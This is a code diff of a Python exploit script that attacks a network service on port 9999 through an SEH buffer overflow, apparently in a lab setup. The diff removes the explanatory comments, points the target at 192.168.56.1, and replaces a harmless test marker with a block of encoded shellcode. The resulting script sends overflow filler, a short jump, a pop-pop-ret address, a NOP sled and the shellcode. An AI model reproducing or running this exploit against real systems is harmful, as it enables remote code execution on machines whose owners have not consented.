@@ -4,33 +4,60 @@ import sys
 import struct
 
 # Configure target details
-TARGET_IP = "127.0.0.1"  
+TARGET_IP = "192.168.56.1"  
 TARGET_PORT = 9999
 
 def main():
     buffer_size = 128
     
-    # 1. Fill the bio_buffer exactly up to the SEH structural frame
+    
     filler = b"A" * buffer_size
     
-    # 2. Overwrite Pointer to Next SEH record (NSEH) with a short jump
-    # \xeb\x06 = JMP SHORT +6 bytes forward (skips directly over the SEH handler address)
-    # \x90\x90 = NOP padding bytes to keep it exactly 4 bytes long
+    
     nseh = b"\xeb\x06\x90\x90" 
     
-    # 3. Overwrite the Exception Handler Pointer with your exact pop-pop-ret address
-    # struct.pack('<I', ...) automatically formats 0x62501413 into Little-Endian bytes (\x13\x14\x50\x62)
+    
     seh_handler = struct.pack('<I', 0x62501413)
     
-    # 4. Safe landing zone (NOP Sled) right after skipping past the SEH block
+   
     nop_sled = b"\x90" * 20
+    buf =  b""
+    buf += b"\xbb\xba\x2c\x1a\x4b\xdb\xcc\xd9\x74\x24\xf4\x5a"
+    buf += b"\x33\xc9\xb1\x59\x31\x5a\x15\x83\xc2\x04\x03\x5a"
+    buf += b"\x11\xe2\x4f\xd0\xf2\xdb\xaf\x29\x03\xbc\x26\xcc"
+    buf += b"\x32\xee\x5c\x84\x67\x3e\x17\xc8\x8b\xb5\x75\xf9"
+    buf += b"\x2c\xe6\x7b\x37\x89\xf6\xcc\x7d\x09\x82\x40\xaa"
+    buf += b"\x60\x54\x08\x96\xe3\x28\x52\xcb\xc3\x11\x9d\x1e"
+    buf += b"\x05\x55\x68\x54\xea\x0b\x3d\x1d\xa6\xbb\x4a\x63"
+    buf += b"\x7b\xbd\x9c\xef\xc3\xc5\x99\x30\xb7\x7f\xa0\x60"
+    buf += b"\x68\x0b\xfa\xa0\x02\x43\xe2\xa1\xc7\xd1\xdb\xd6"
+    buf += b"\xdd\x90\x50\x22\xa9\xa8\x1b\xb3\xac\x78\xd2\x83"
+    buf += b"\x6e\x4b\x19\xa8\x70\x93\x19\x50\x07\xef\x62\xed"
+    buf += b"\xcc\x7a\x76\x55\x86\xdd\x52\x67\x4b\xbb\x11\x6b"
+    buf += b"\x20\xcf\x7d\x68\xb7\x1c\xf6\x94\x3c\xa3\xd8\x1c"
+    buf += b"\x06\x80\xfc\x45\xdc\xa9\xa5\x23\xb3\xd6\xb5\x8c"
+    buf += b"\x6c\x73\xbe\x3f\x7a\xfc\x3f\xc0\x83\x5e\xd7\x0c"
+    buf += b"\x4e\x61\x27\x1b\xd9\x12\x15\x84\x71\xbd\xb1\xbc"
+    buf += b"\x3d\xb2\xc8\x29\x3e\x1c\x72\x39\xc0\x9d\x82\x13"
+    buf += b"\x07\xc9\xd2\x0b\x39\x1d\x73\x70\xba\x37\x19\x8d"
+    buf += b"\x2d\x78\x75\xa9\xc8\x10\x87\xca\x03\xbd\x0e\x2c"
+    buf += b"\x73\x6d\x40\xe1\x34\xdd\x20\x51\xdd\xa2\xdf\x44"
+    buf += b"\x81\xa2\xca\xf0\xd3\x4c\xa2\xa9\x4b\x93\xba\x3c"
+    buf += b"\xff\x94\xef\x44\x3f\x1e\x05\xb8\x8e\xd7\x6c\xaa"
+    buf += b"\xe7\x8f\x8e\x32\xf8\x25\x8e\x58\xfc\xef\xd9\xf4"
+    buf += b"\xee\x03\x48\xd5\xf0\xc9\x11\x2e\x0e\x8c\x23\x44"
+    buf += b"\x39\x1a\x0b\x32\x46\xca\x8b\xc2\x10\x80\x8b\xaa"
+    buf += b"\x68\xe7\xff\x47\x6e\xdd\x6c\xc4\xfa\xde\xc4\xb8"
+    buf += b"\xad\xb6\xfa\x32\xff\x96\x05\x9f\x7c\xe0\xf9\x5d"
+    buf += b"\xab\x49\x91\x9d\xeb\x69\x61\xf4\xeb\x39\x09\x83"
+    buf += b"\x37\x97\x6b\x6c\x12\xbf\x03\xe7\xa5\xb6\x9e\xf8"
+    buf += b"\x03\x68\x7e\xf8\xa0\xb1\x71\x83\xc9\x46\x72\x74"
+    buf += b"\xc0\x22\x73\x74\xec\x54\x48\xa2\xd5\x22\x8f\x76"
+    buf += b"\x62\xbc\x6d\xbb\x5d\x57\x71\x68\xa1\x7d"
     
-    # 5. Testing payload to prove execution control (fills EIP with "C"s / \x43)
-    # In a real attack scenario, your shellcode would replace these bytes
-    payload_marker = b"C" * 400
     
-    # Assemble the full structured sequence matching your server's BIO command
-    payload = b"BIO " + filler + nseh + seh_handler + nop_sled + payload_marker + b"\r\n"
+    
+    payload = b"BIO " + filler + nseh + seh_handler + nop_sled + buf + b"\r\n"
     
     print(f"[*] Target POP-POP-RET address: 0x62501413")
     print(f"[*] Total payload length: {len(payload)} bytes")
@@ -41,11 +68,11 @@ def main():
         s.settimeout(5)
         s.connect((TARGET_IP, TARGET_PORT))
         
-        # Read the initial welcome banner from the server
-        banner = s.recv(1024)
+       
+        
         print("[+] Connected! Received server banner.")
         
-        # Send the payload
+        
         print("[*] Sending weaponized SEH bypass payload...")
         s.sendall(payload)
         
